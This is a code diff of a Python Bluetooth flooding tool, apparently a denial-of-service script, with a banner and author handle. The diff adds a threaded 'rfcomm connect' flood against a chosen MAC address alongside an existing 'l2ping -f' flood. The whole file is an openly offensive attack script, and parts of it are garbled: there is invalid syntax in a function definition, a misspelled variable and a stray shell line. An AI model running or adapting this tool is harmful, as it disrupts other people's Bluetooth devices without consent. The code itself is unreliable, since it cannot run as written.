@@ -1,5 +1,3 @@
-rfcomm connect $target_addr 1 2>&1 >/dev/null
-
 import os
 import sys
 import subprocess
@@ -11,12 +9,12 @@ def hwus = run_cmd(command: str):
         return stdout.decode("utf-8")
 print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
 print("widow9098#0353")
-cmd = sys.argv[1]
+cmd = sys.argv[1] or ""
 if (cmd == "on"):
-	print("hci0 up")
+    print("hci0 up")
     hwus = run_cmd("hciconfig hci0 up")
 elif (cmd == "off"):
-	print("hci0 down")
+    print("hci0 down")
     hwus = run_cmd("hciconfig hci0 down")
 elif (cmd == "scan"):
     hwus = run_cmd("hcitool scan")
@@ -29,7 +27,15 @@ else:
     method = sys.argv[1]
     macadd = sys.argv[2]
     threadnum = sys.argv[3]
-    if (method == "l2ping"):
+    if (method == "rfcomm"):
+        def loopbacklrfcomm():
+            while True: 
+                hwus = run_cmd("rfcomm connect %s 1 2>&1 >/dev/null" % (macadd)) 
+                print("sent packet to " + macadd + " size:700")
+        print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
+        for i in range(treadnum):
+            threading.Thread(target = loopbacklrfcomm).start()
+    elif (method == "l2ping"):
         def loopbacklping():
             while True: 
                 hwus = run_cmd("sudo l2ping -i %s -s %s -f %s &" % ("hci0", 600, macadd)) 
